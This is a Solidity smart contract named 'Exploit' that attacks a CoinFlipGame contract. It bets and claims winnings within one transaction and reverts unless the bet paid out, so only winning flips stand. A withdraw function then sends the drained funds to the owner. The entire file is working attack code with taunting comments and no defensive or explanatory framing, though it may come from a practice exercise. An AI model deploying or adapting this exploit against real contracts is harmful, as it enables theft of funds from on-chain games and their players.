//SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

import {CoinFlipGame} from "Game.sol";

contract Exploit {
    // Game Contract
    CoinFlipGame private _contract;
    // Owner
    address private _owner;
    constructor(address payable _c) payable {
        require(_c != address(0x0));
        _owner = msg.sender;
        _contract = CoinFlipGame(_c);
    }

    // Can't frontrun the atomicity of a smart contract ;)
    function exploit(uint amount) public {
        require(msg.sender == _owner);
        require(address(this).balance > amount);
        require(address(_contract).balance >= amount);
        uint _before = address(this).balance;
        _contract.flipCoin{value: amount}(0x0);
        _contract.claimWinnings();
        // If the transfer doesn't go through, it never happened
        require(address(this).balance == (amount + _before),"no transfer");
    }

    // Thank you very much!
    function withdrawAmt(uint amount) public
    {
        require(msg.sender == _owner);
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success);
    }
    receive() external payable {}   
}
